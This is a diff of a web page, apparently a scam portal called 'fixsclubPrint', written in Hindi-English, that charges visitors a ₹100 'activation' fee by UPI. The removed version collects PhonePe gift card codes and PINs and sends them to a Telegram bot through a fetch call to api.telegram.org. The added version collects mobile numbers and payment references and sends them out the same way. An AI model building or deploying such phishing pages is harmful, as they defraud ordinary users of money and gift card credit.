@@ -3,86 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>fixsclubPrint | Payment & ID Portal</title>
+    <title>fixsclubPrint | Login Portal</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; margin: 0; text-align: center; }
-        .header { background: #1a237e; color: white; padding: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
-        .container { max-width: 450px; margin: 20px auto; padding: 10px; }
-        .card { background: white; border-radius: 15px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-bottom: 20px; border-top: 5px solid #1a237e; }
-        .qr-frame { background: #fff; padding: 15px; border: 2px solid #673ab7; border-radius: 10px; display: inline-block; margin: 10px 0; }
-        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 15px; }
-        .btn { background: #28a745; color: white; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 17px; font-weight: bold; cursor: pointer; }
-        .btn-gen { background: #1a237e; margin-top: 10px; }
-        .footer-text { font-size: 12px; color: #666; margin-top: 10px; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 0; text-align: center; }
+        .header { background: #1a237e; color: white; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
+        .container { max-width: 400px; margin: 30px auto; padding: 15px; }
+        .card { background: white; border-radius: 15px; padding: 25px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); border-top: 6px solid #1a237e; }
+        .qr-box { background: #fff; padding: 10px; border: 2px solid #673ab7; border-radius: 10px; display: inline-block; margin: 15px 0; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 15px; outline: none; }
+        input:focus { border-color: #1a237e; }
+        .btn-login { background: #1a237e; color: white; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn-login:hover { background: #0d1442; }
+        .footer-note { font-size: 12px; color: #666; margin-top: 20px; }
+        .status-msg { color: #d32f2f; font-weight: bold; font-size: 13px; }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <h2 style="margin:0;">fixsclubPrint Official</h2>
-    <p style="margin:5px 0 0;">Secure Document Services</p>
+    <h2 style="margin:0;">fixsclubPrint</h2>
+    <p style="margin:5px 0 0;">Official Login & Activation</p>
 </div>
 
 <div class="container">
-    <div class="card">
-        <h3>💰 Payment & Activation</h3>
-        <p style="font-size:14px;">Services chalu karne ke liye ₹100 pay karein:</p>
+    <div class="card" id="loginBox">
+        <h3 style="margin-top:0; color:#1a237e;">Member Login</h3>
+        <p style="font-size:14px; color:#555;">Naye users ko activation ke liye ₹100 pay karna hoga.</p>
         
-        <div class="qr-frame">
-            <img src="https://i.ibb.co/v4m0Yv8/51977.jpg" alt="UPI QR" style="width:200px; border-radius:5px;">
-            <p style="margin:5px 0 0; font-weight:bold; font-size:14px;">UPI: Q973860146@ybl</p>
+        <div class="qr-box">
+            <div id="qrcode"></div>
+            <p style="margin:8px 0 0; font-weight:bold; font-size:13px;">UPI: Q973860146@ybl</p>
         </div>
 
-        <div style="margin-top:15px; border-top: 1px solid #eee; padding-top:10px;">
-            <p style="font-weight:bold; color:#d32f2f;">OR Use PhonePe Gift Card</p>
-            <input type="text" id="gc_code" placeholder="Gift Card Code (16 Digit)">
-            <input type="text" id="gc_pin" placeholder="Gift Card PIN (6 Digit)">
-            <button class="btn" onclick="sendToTelegram()">Submit & Activate</button>
+        <div style="text-align:left; margin-top:10px;">
+            <label><b>Mobile Number / User ID:</b></label>
+            <input type="text" id="userid" placeholder="Enter Mobile Number">
+            
+            <label><b>Payment Ref No (UTR):</b></label>
+            <input type="text" id="utr" placeholder="Enter 12 Digit UTR after payment">
         </div>
-        <p class="footer-text">⚠️ Galat details par ₹50 fine lagega!</p>
-    </div>
 
-    <div class="card">
-        <h3>🆔 Automatic ID QR Generator</h3>
-        <p style="font-size:13px; color:#555;">Details bharein, QR apne aap ban jayega:</p>
-        <input type="text" id="name" placeholder="Pura Naam (Aadhaar/Voter ke liye)">
-        <input type="text" id="addr" placeholder="Pura Pata (Address)">
-        <button class="btn btn-gen" onclick="generateAutoQR()">Generate QR Code</button>
+        <p class="status-msg" id="statusText"></p>
         
-        <div id="result-qr" style="margin-top:20px; display:flex; justify-content:center;"></div>
+        <button class="btn-login" onclick="handleLogin()">Login / Activate</button>
+
+        <div class="footer-note">
+            Aapka account verify hone mein 15-30 minute lag sakte hain. Sahi details hi bharein.
+        </div>
     </div>
 </div>
 
 <script>
-    // Document QR Generator Function
-    function generateAutoQR() {
-        const name = document.getElementById('name').value;
-        const addr = document.getElementById('addr').value;
-        if(!name || !addr) { alert("Naam aur Pata bhariye!"); return; }
-
-        document.getElementById('result-qr').innerHTML = "";
-        new QRCode(document.getElementById("result-qr"), {
-            text: `Name: ${name}\nAddress: ${addr}\nVerified: fixsclubPrint`,
-            width: 130,
-            height: 130
+    // Site khulte hi QR generate hoga
+    window.onload = function() {
+        new QRCode(document.getElementById("qrcode"), {
+            text: "upi://pay?pa=Q973860146@ybl&pn=fixsclubPrint&am=100&cu=INR",
+            width: 160,
+            height: 160
         });
-    }
+    };
 
-    // Telegram Function
-    function sendToTelegram() {
-        const code = document.getElementById('gc_code').value;
-        const pin = document.getElementById('gc_pin').value;
-        
-        if(code.length < 10) { alert("Sahi Gift Card dalein!"); return; }
+    function handleLogin() {
+        const user = document.getElementById('userid').value;
+        const utr = document.getElementById('utr').value;
+        const status = document.getElementById('statusText');
 
-        const botToken = "YOUR_BOT_TOKEN"; // Yahan Token dalein
-        const chatId = "YOUR_CHAT_ID";     // Yahan Chat ID dalein
-        const msg = `💳 NAYA DATA\nGC: ${code}\nPIN: ${pin}\nSite: fixsclubprint.github.io`;
+        if(user.length < 10 || utr.length < 12) {
+            status.innerText = "⚠️ Kripya sahi Mobile No. aur 12 digit UTR dalein!";
+            return;
+        }
 
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
-        .then(() => alert("Verification chalu hai! 15 min wait karein."))
-        .catch(() => alert("Error! Koshish karein."));
+        // Telegram Notification Setup
+        const botToken = "YOUR_BOT_TOKEN"; // Apna Token dalein
+        const chatId = "YOUR_CHAT_ID";     // Apni Chat ID dalein
+        const message = `🚀 LOGIN REQUEST\n👤 User: ${user}\n📝 UTR: ${utr}\n💰 Status: Pending`;
+
+        status.innerText = "⏳ Verifying... Please wait.";
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+        .then(() => {
+            alert("Aapki request bhej di gayi hai! Verification ke baad portal automatic chalu ho jayega.");
+            document.getElementById('userid').value = "";
+            document.getElementById('utr').value = "";
+            status.innerText = "✅ Request Sent! Wait 15 mins.";
+        })
+        .catch(() => {
+            alert("Internet Error! Dubara koshish karein.");
+            status.innerText = "";
+        });
     }
 </script>
 
